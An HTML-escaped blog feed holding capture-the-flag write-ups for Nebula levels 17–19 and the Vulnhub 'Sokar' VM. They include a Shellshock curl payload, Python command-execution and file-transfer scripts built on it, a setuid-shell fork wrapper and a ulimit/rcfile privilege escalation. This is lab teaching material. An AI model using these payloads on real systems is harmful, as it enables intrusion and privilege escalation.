level17@nebula:/var/tmp/flag17-prep$ python sploit.py
level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level18&#34;&gt;level18&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level18/&#34;&gt;Level18&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE &amp;quot;/home/flag18/password&amp;quot;

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, &amp;quot;r&amp;quot;);
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;
  }
  dprintf(&amp;quot;logged in successfully (with%s password file)\n&amp;quot;,
      fp == NULL ? &amp;quot;out&amp;quot; : &amp;quot;&amp;quot;);

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;amp;buffer, &amp;quot;--&amp;gt; [%s] is unsupported at this current time.\n&amp;quot;, what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, &amp;quot;unable to set user to &#39;%s&#39; -- not supported.\n&amp;quot;, user);
  printf(&amp;quot;%s\n&amp;quot;, msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, &amp;quot;d:v&amp;quot;)) != -1) {
      switch(c) {
          case &#39;d&#39;:
              globals.debugfile = fopen(optarg, &amp;quot;w+&amp;quot;);
              if(globals.debugfile == NULL) err(1, &amp;quot;Unable to open %s&amp;quot;, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case &#39;v&#39;:
              globals.verbose++;
              break;
      }
  }

  dprintf(&amp;quot;Starting up. Verbose level = %d\n&amp;quot;, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, &#39;\n&#39;); if(p) *p = 0;
      p = strchr(line, &#39;\r&#39;); if(p) *p = 0;

      dvprintf(2, &amp;quot;got [%s] as input\n&amp;quot;, line);

      if(strncmp(line, &amp;quot;login&amp;quot;, 5) == 0) {
          dvprintf(3, &amp;quot;attempting to login\n&amp;quot;);
          login(line + 6);
      } else if(strncmp(line, &amp;quot;logout&amp;quot;, 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, &amp;quot;shell&amp;quot;, 5) == 0) {
          dvprintf(3, &amp;quot;attempting to start shell\n&amp;quot;);
          if(globals.loggedin) {
              execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
              err(1, &amp;quot;unable to execve&amp;quot;);
          }
          dprintf(&amp;quot;Permission denied\n&amp;quot;);
      } else if(strncmp(line, &amp;quot;logout&amp;quot;, 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, &amp;quot;closelog&amp;quot;, 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, &amp;quot;site exec&amp;quot;, 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, &amp;quot;setuser&amp;quot;, 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.&lt;/p&gt;

&lt;p&gt;Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is &lt;code&gt;/home/flag18/password&lt;/code&gt; and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p&lt;/p&gt;

&lt;p&gt;So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a &lt;code&gt;closelog&lt;/code&gt; command too. So, I started to play around with &lt;code&gt;ulimit&lt;/code&gt;, gradually reducing &lt;code&gt;-n&lt;/code&gt; until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.&lt;/p&gt;

&lt;p&gt;Without setting the max open files, a sample run would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ touch /tmp/log
level18@nebula:~$ tail -f /tmp/log &amp;amp;
[1] 6499

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
shell
got [shell] as input
attempting to start shell
Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dropping the max open files to 4 though, we get:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ulimit -n 4

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
shell
got [shell] as input
attempting to start shell
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that &lt;code&gt;closelog&lt;/code&gt; command that will free up a file descriptor. Rerunning the above but calling &lt;code&gt;closelog&lt;/code&gt; before we call &lt;code&gt;shell&lt;/code&gt; results in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] ...
    /home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      (invocation only)
    -abefhkmnptuvxBCHP or -o option
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examining the error we get now together with the source code, it was clear that the arguments sent to the &lt;code&gt;flag18&lt;/code&gt; binary was also passed to the &lt;code&gt;execve()&lt;/code&gt; call. That means that the error is actually sourced from the fact that &lt;code&gt;sh&lt;/code&gt; has no &lt;code&gt;-d&lt;/code&gt; flag. In fact, one could replicate this error by simply calling &lt;code&gt;sh -d&lt;/code&gt;. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the &lt;em&gt;GNU long options&lt;/em&gt; are shown. &lt;code&gt;--rcfile&lt;/code&gt; seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running &lt;code&gt;flag18&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- &#39;-&#39;
/home/flag18/flag18: invalid option -- &#39;r&#39;
/home/flag18/flag18: invalid option -- &#39;c&#39;
/home/flag18/flag18: invalid option -- &#39;f&#39;
/home/flag18/flag18: invalid option -- &#39;i&#39;
/home/flag18/flag18: invalid option -- &#39;l&#39;
/home/flag18/flag18: invalid option -- &#39;e&#39;
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: got: command not found
/tmp/log: line 3: attempting: command not found
/tmp/log: line 4: syntax error near unexpected token `(&#39;
/tmp/log: line 4: `logged in successfully (without password file)&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The line &lt;code&gt;Starting: command not found&lt;/code&gt; was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my &lt;code&gt;PATH&lt;/code&gt; and used it to prepare a small SETUID C shell.&lt;/p&gt;

&lt;p&gt;So, to solve level18:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ vim /var/tmp/Starting
level18@nebula:~$ chmod +x /var/tmp/Starting
level18@nebula:~$ cat /var/tmp/Starting
#!/bin/sh
/bin/sh

level18@nebula:~$ tail -f /tmp/log &amp;amp;
[1] 7627

level18@nebula:~$ Starting up. Verbose level = 3
got [login egg] as input
attempting to login
logged in successfully (without password file)
got [closelog] as input

level18@nebula:~$ export PATH=/var/tmp:$PATH
level18@nebula:~$ ulimit -n 4

level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- &#39;-&#39;
/home/flag18/flag18: invalid option -- &#39;r&#39;
/home/flag18/flag18: invalid option -- &#39;c&#39;
/home/flag18/flag18: invalid option -- &#39;f&#39;
/home/flag18/flag18: invalid option -- &#39;i&#39;
/home/flag18/flag18: invalid option -- &#39;l&#39;
/home/flag18/flag18: invalid option -- &#39;e&#39;
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell

sh-4.2$ getflag
sh: start_pipeline: pgrp pipe: Too many open files
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level19&#34;&gt;level19&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level19/&#34;&gt;Level19&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a flaw in the below program in how it operates.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent&#39;s /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, &amp;quot;/proc/%d&amp;quot;, getppid());

  /* stat() it */

  if(stat(buf, &amp;amp;statbuf) == -1) {
      printf(&amp;quot;Unable to check parent process\n&amp;quot;);
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
      err(1, &amp;quot;Unable to execve&amp;quot;);
  }

  printf(&amp;quot;You are unauthorized to run this program\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a &lt;code&gt;fork()&lt;/code&gt; operation on the &lt;code&gt;flag19&lt;/code&gt; binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.&lt;/p&gt;

&lt;p&gt;To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can &lt;code&gt;execv()&lt;/code&gt; the &lt;code&gt;flag19&lt;/code&gt; binary and prepare a shell :)&lt;/p&gt;

&lt;p&gt;So, to solve level19:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level19@nebula:/var/tmp$ vim pwn19.c
level19@nebula:/var/tmp$ cat pwn19.c
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;

int main(void) {

    pid_t pid = fork();

    if (pid == 0) {

        char *arg[] = { &amp;quot;/bin/sh&amp;quot; , &amp;quot;-c&amp;quot; , &amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19&amp;quot; , NULL};
        sleep(2); /* Give the fork 2 sec to orphan */
        execv(&amp;quot;/home/flag19/flag19&amp;quot;, arg);
        printf(&amp;quot;Done fork\n&amp;quot;);
        return 0;
    }

    printf(&amp;quot;Done parent\n&amp;quot;);
    return 0;
}

level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
level19@nebula:/var/tmp$ ./pwn19
Done parent

level19@nebula:/var/tmp$ /var/tmp/flag19
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&amp;hellip; ;)&lt;/p&gt;

&lt;p&gt;As a final touch, my &amp;lsquo;loot&amp;rsquo; in &lt;code&gt;/var/tmp&lt;/code&gt; after finishing the last level:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_done.png&#34; /&gt;
    
    
&lt;/figure&gt;</description>
    </item>
    
    <item>
      <title>beating sokar the vulnhub turns 0b10 challenge</title>
      <link>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</link>
      <pubDate>Sat, 21 Feb 2015 15:55:03 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html&#34;&gt;Vulnhub is 0b10&lt;/a&gt; years old. That is binary for 2 :) In order to celebrate this, &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt;
 created &lt;a href=&#34;https://www.vulnhub.com/entry/sokar-1,113/&#34;&gt;Sokar&lt;/a&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/sokar_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Sokar was used as another writeup competition (the first for 2015), similar to the &lt;a href=&#34;https://leonjza.github.io/blog/2014/09/18/from-persistence/&#34;&gt;Persistence&lt;/a&gt; challenge from Sep &amp;lsquo;14.
From the &lt;a href=&#34;http://blog.vulnhub.com/2015/01/competition-sokar.html&#34;&gt;competition announcement blogpost&lt;/a&gt;, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.&lt;/p&gt;

&lt;p&gt;Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!&lt;/p&gt;

&lt;p&gt;Here is my entry for the competition. Enjoy! :)
&lt;/p&gt;

&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;

&lt;p&gt;You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire &lt;code&gt;nmap&lt;/code&gt; at it. I followed exactly these steps apart from using the usual &lt;code&gt;netdiscover&lt;/code&gt; to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.&lt;/p&gt;

&lt;p&gt;I knew which interface the network was bound to on my Mac, so I started the sniffer with &lt;code&gt;sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1

[... snip IPv6 talky talky ...]

IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;192.168.217.163&lt;/strong&gt;. Great. This will be our target for a &lt;code&gt;nmap&lt;/code&gt; scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&amp;rsquo;t rely on ICMP traffic ;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST
Nmap scan report for 192.168.217.163
Host is up, received arp-response (0.00027s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT    STATE SERVICE  REASON
591/tcp open  http-alt syn-ack
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One port open on tcp. &lt;code&gt;tcp/591&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;cgi-bin-cat&#34;&gt;/cgi-bin/cat&lt;/h2&gt;

&lt;p&gt;The service on &lt;code&gt;tcp/591&lt;/code&gt; appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; to &lt;a href=&#34;http://192.168.217.163:591/cgi-bin/cat&#34;&gt;http://192.168.217.163:591/cgi-bin/cat&lt;/a&gt;. Requesting this page alone was the same stats, minus that creepy pink color ;)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/sokar_cat.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I toyed around quite a bit with this webserver. The textbook approach of running &lt;code&gt;wfuzz&lt;/code&gt; to discover some web paths, &lt;code&gt;nikto&lt;/code&gt; to discover some interesting information etc. was used. Alas, none of these tools proved really useful.&lt;/p&gt;

&lt;p&gt;Applying some more brain thingies to my current situation, I remembered the &lt;a href=&#34;http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&#34;&gt;Shellshock&lt;/a&gt; bug disclosed in September 2014. The &lt;code&gt;/cgi-bin&lt;/code&gt; path was the biggest hint towards it. I also remembered &lt;a href=&#34;https://twitter.com/mubix&#34;&gt;@mubix&lt;/a&gt; was keeping a Github repository of &lt;a href=&#34;https://github.com/mubix/shellshocker-pocs&#34;&gt;PoC&amp;rsquo;s for shellshock&lt;/a&gt;, and promptly started to try a few against the CGI path.&lt;/p&gt;

&lt;p&gt;Eventually, &lt;a href=&#34;https://gist.github.com/mfadzilr/70892f43597e7863a8dc&#34;&gt;this&lt;/a&gt; PoC was modified a little to get me some working command injection via shellshock:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/usr/bin/id&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2015 21:23:07 GMT
Server: Apache/2.2.15 (CentOS)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8

uid=48(apache) gid=48(apache) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay. I was now able to execute commands as &lt;code&gt;apache&lt;/code&gt;. This allowed me to enumerate a great deal of the machine with relative ease.&lt;/p&gt;

&lt;h2 id=&#34;making-life-easier&#34;&gt;making life easier&lt;/h2&gt;

&lt;p&gt;Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called &lt;code&gt;shock.py&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Shellshock Command Execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

# vuln@ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
command = sys.argv[1].strip()
print &amp;quot; * Executing %s\n&amp;quot; % command

# prepare the sploit header
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % command }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the above script, I could now just do &lt;code&gt;python shock.py &amp;quot;/usr/bin/id&amp;quot;&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/id&amp;quot;
 * Executing /usr/bin/id

uid=48(apache) gid=48(apache) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that &lt;code&gt;netcat&lt;/code&gt; was available and that &lt;code&gt;apache&lt;/code&gt; was allowed to execute it, however, all of my attempts failed. &lt;code&gt;SELinux&lt;/code&gt; was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!&lt;/p&gt;

&lt;p&gt;I was able to write to &lt;code&gt;/tmp&lt;/code&gt;, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially &lt;code&gt;echo &amp;lt;script source&amp;gt; &amp;gt;&amp;gt; /tmp/port_scan.py&lt;/code&gt;. Eventually I resorted to writing a helper called &lt;code&gt;transfer.py&lt;/code&gt; that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Shellshock File Transfer
# 2015 Leon Jacobs

import requests
import sys
import os
import binascii

def do_command(command):

    headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % command }
    r = requests.options(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers)

    if not r.status_code == 200:
        raise Exception(&amp;quot; ! Command %s failed&amp;quot;)

if __name__ == &amp;quot;__main__&amp;quot;:

    if len(sys.argv) &amp;lt; 3:

        print &amp;quot; * Usage %s &amp;lt;source&amp;gt; &amp;lt;destination&amp;gt;&amp;quot; % sys.argv[0]
        sys.exit(1)

    # vuln@ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
    source = sys.argv[1].strip()
    destination = sys.argv[2].strip()
    print &amp;quot; * Starting transfer of local &#39;%s&#39; to remote &#39;%s&#39;&amp;quot; % (source, destination)

    hex_destination_file = &amp;quot;/tmp/&amp;quot; + binascii.b2a_hex(os.urandom(15)) + &amp;quot;.txt&amp;quot;
    print &amp;quot; * Temp file on remote will be: %s&amp;quot; % hex_destination_file

    # prepare a hex version of the local file
    with open(source) as f:
        source_file = f.read()

    # encode and split the source into chunks of 60
    source_file = source_file.encode(&#39;hex&#39;)
    source_data = {}
    source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]

    print &amp;quot; * Transferring %d chunks to %s&amp;quot; % (len(source_data), hex_destination_file)
    iteration = 1
    for chunk in source_data:

        # check if it is start of file or append
        if iteration == 1:
            append = &amp;quot;&amp;gt;&amp;quot;
        else:
            append = &amp;quot;&amp;gt;&amp;gt;&amp;quot;

        # prepare the command and run it
        command = &amp;quot;echo &#39;%s&#39; %s %s&amp;quot; % (chunk, append, hex_destination_file)
        do_command(command)

        print &amp;quot; * Chunk %d/%d transferred&amp;quot; % (iteration, len(source_data))
        iteration += 1

    print &amp;quot; * Decoding hex on remote&amp;quot;
    command = &amp;quot;/usr/bin/xxd -r -p %s &amp;gt; %s&amp;quot; % (hex_destination_file, destination)
    do_command(command)

    print &amp;quot; * Cleaning up temp file %s&amp;quot; % hex_destination_file
    command = &amp;quot;/bin/rm -f %s&amp;quot; %  hex_destination_file
    do_command(command)

    print &amp;quot; * Local &#39;%s&#39; transferred to remote &#39;%s&#39;&amp;quot; % (source, destination)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;egress-firewalls-le-suck&#34;&gt;egress firewalls le-suck&lt;/h2&gt;

&lt;p&gt;With the file transfer script done, I coded up a small &amp;lsquo;port scanner&amp;rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Egress Port Scanner
# 2015 Leon Jacobs

import socket

for port in xrange(1, 65535):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    print &amp;quot;Trying port %d&amp;quot; % port
    sock.connect_ex((&amp;quot;192.168.217.174&amp;quot;, port))
    sock.close()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and transferred it to Sokar using my &lt;code&gt;transfer.py&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
 * Starting transfer of local &#39;port_scan.py&#39; to remote &#39;/tmp/port_scan.py&#39;
 * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Chunk 1/10 transferred
 * Chunk 2/10 transferred
 * Chunk 3/10 transferred
 * Chunk 4/10 transferred
 * Chunk 5/10 transferred
 * Chunk 6/10 transferred
 * Chunk 7/10 transferred
 * Chunk 8/10 transferred
 * Chunk 9/10 transferred
 * Chunk 10/10 transferred
 * Decoding hex on remote
 * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Local &#39;port_scan.py&#39; transferred to remote &#39;/tmp/port_scan.py&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I also opened up a &lt;code&gt;tcpdump&lt;/code&gt; on my local Kali Linux VM, filtering out &lt;code&gt;tcp/591&lt;/code&gt; as well as &lt;code&gt;arp&lt;/code&gt; traffic:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally, I fired the scanner off using the previously developed &lt;code&gt;shock.py&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/python /tmp/port_scan.py&amp;quot;
 * Executing /usr/bin/python /tmp/port_scan.py

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I waited&amp;hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the &lt;code&gt;tcpdump&lt;/code&gt; had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.&lt;/p&gt;

&lt;h2 id=&#34;bynarr-the-fruit&#34;&gt;bynarr the fruit&lt;/h2&gt;

